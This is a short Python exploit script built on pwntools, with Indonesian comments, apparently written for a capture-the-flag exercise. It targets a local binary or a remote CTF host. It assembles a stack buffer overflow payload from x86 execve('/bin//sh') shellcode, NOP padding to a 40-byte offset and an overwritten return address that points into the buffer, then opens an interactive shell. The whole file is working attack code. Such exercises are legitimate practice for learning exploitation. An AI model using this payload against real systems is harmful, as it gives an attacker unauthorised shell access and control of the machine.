from pwn import *

# === KONFIGURASI ===
# Ganti alamat_buffer dengan hasil 'info register' atau output program di GDB
alamat_buffer = 0xbffff4a0 

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"

# Pilih mode: 'local' atau 'remote'
mode = 'local'

if mode == 'local':
    p = process('./vulnerable_program')
else:
    p = remote('target.ctf.com', 1234)

# === PAYLOAD BUILDING ===
# Offset 40 didapat dari: 32 (buffer) + 8 (EBP/padding)
# Atau gunakan cyclic -l jika offset berbeda
payload = shellcode
payload += b"\x90" * (40 - len(shellcode)) # Padding hingga mencapai offset ret
payload += p32(alamat_buffer)              # Timpa Return Address ke arah buffer

# === KIRIM ===
p.sendline(payload)
p.interactive()